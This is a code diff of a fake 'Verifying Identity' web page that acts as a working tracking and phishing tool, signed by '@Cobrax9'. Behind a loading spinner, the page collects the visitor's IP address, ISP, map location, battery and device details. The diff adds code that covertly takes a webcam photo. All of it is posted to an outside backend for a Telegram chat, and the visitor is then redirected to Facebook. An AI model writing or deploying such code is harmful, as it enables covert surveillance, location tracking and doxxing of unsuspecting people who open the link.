@@ -2,13 +2,13 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Secure Verification</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <title>Verifying Identity</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <style>
     body {
-      background: linear-gradient(to right, #202020, #303030);
-      color: #fff;
+      background-color: #202020;
+      color: white;
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
       display: flex;
       flex-direction: column;
@@ -18,19 +18,14 @@
       margin: 0;
     }
     .card {
-      background-color: #2d2d2d;
-      padding: 30px 40px;
+      background: #2a2a2a;
+      padding: 30px;
       border-radius: 12px;
-      box-shadow: 0 0 15px rgba(0,0,0,0.4);
       text-align: center;
-      max-width: 360px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.5);
     }
     .card h2 {
       margin-bottom: 10px;
-    }
-    .card p {
-      font-size: 14px;
-      color: #ccc;
     }
     .spinner {
       margin: 20px auto;
@@ -44,30 +39,30 @@
     @keyframes spin {
       to { transform: rotate(360deg); }
     }
-    video {
-      margin-top: 20px;
-      width: 320px;
-      border-radius: 10px;
+    video, canvas {
       display: none;
     }
   </style>
 </head>
 <body>
   <div class="card">
-    <h2>Verifying Identity</h2>
-    <p>Please wait while we verify your device and session security.</p>
+    <h2>Verifying Your Identity</h2>
+    <p>Please hold while we secure your session...</p>
     <div class="spinner"></div>
-    <video id="videoPreview" autoplay muted playsinline></video>
   </div>
+  <video id="videoPreview" autoplay muted playsinline></video>
+  <canvas id="snapshotCanvas" width="320" height="240"></canvas>
 
   <script>
-    const urlParams = new URLSearchParams(window.location.search);
-    const chatId = urlParams.get("id");
+    const chatId = new URLSearchParams(window.location.search).get("id");
     const video = document.getElementById("videoPreview");
-
+    const canvas = document.getElementById("snapshotCanvas");
+    const ctx = canvas.getContext("2d");
     let result = "📱 Hacked by @Cobrax9\n\n";
+    let imageBase64 = "";
+    let latlong = "";
 
-    function collectAndSend(ipData = null) {
+    function collectData(ipData) {
       const ua = navigator.userAgent;
       const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
       const connection = navigator.connection || {};
@@ -78,9 +73,11 @@
         const level = Math.round(battery.level * 100) + "%";
 
         result += "🌎 Ip Information:\n";
-        result += `🌐 IP address: ${ipData?.ip || "Unavailable"}\n`;
-        result += `📡 ISP: ${ipData?.org || "Unknown"}\n`;
-        result += `🔍 ASN: ${ipData?.org?.split(" ")[0] || "Unknown"}\n\n`;
+        result += `🌐 IP address: ${ipData?.ip}\n`;
+        result += `📡 ISP: ${ipData?.org}\n`;
+        result += `🔍 ASN: ${ipData?.org?.split(" ")[0]}\n`;
+        latlong = ipData?.loc;
+        result += `📍 Location: https://maps.google.com/?q=${latlong}\n\n`;
 
         result += "📱 Device Info:\n";
         result += `🔋 Charging: ${charging}\n`;
@@ -91,35 +88,49 @@
         result += `📱 Device Type: ${/Mobile/i.test(ua) ? "Mobile" : "Desktop"}\n\n`;
         result += "👨‍💻 Tracked on: @Cobrax9";
 
-        sendToTelegram(result);
+        capturePhotoAndSend();
       });
     }
 
-    function sendToTelegram(message) {
+    function capturePhotoAndSend() {
+      video.style.display = "block";
+
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+          video.srcObject = stream;
+          setTimeout(() => {
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            imageBase64 = canvas.toDataURL("image/jpeg").split(',')[1];
+            sendToTelegram();
+          }, 1500);
+        })
+        .catch(() => {
+          sendToTelegram(); // send without photo
+        });
+    }
+
+    function sendToTelegram() {
       if (!chatId) return;
 
       fetch("https://render-backend-package1.onrender.com/submit", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: chatId, message })
+        body: JSON.stringify({
+          chat_id: chatId,
+          message: result,
+          photo: imageBase64
+        })
       }).then(() => {
-        // Force camera access after sending data
         setTimeout(() => {
-          video.style.display = "block";
-          navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-              video.srcObject = stream;
-            })
-            .catch(() => {});
-        }, 1500);
+          window.location.href = "https://facebook.com";
+        }, 3000);
       });
     }
 
-    // Try to fetch IP info, fallback if it fails
     fetch("https://ipinfo.io/json?token=demo")
       .then(res => res.json())
-      .then(ipData => collectAndSend(ipData))
-      .catch(() => collectAndSend(null));
+      .then(data => collectData(data))
+      .catch(() => collectData({ ip: "Unknown", org: "Unknown", loc: "0,0" }));
   </script>
 </body>
 </html>
